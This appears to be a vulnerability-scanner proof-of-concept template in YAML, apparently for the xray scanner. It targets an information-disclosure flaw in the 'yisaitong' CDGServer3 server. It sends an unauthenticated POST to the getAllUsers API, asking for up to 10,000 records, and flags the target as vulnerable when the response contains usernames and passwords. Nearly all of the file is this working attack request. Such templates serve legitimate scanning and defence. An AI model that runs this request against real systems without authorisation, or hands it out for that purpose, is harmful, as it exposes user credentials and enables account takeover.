name: poc-yaml-yisaitong-getAllUsers-Information-disclosure
transport: http



rules:
  r0:
    request:
      method: POST
      path: /CDGServer3/openapi/getAllUsers
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
      body: |
        pageSize=10000&pageNumber=1
    expression: response.status == 200 && response.body.bcontains(b'password') && response.body.bcontains(b'username')
expression: r0()

detail:
  author: Superhero
  links:
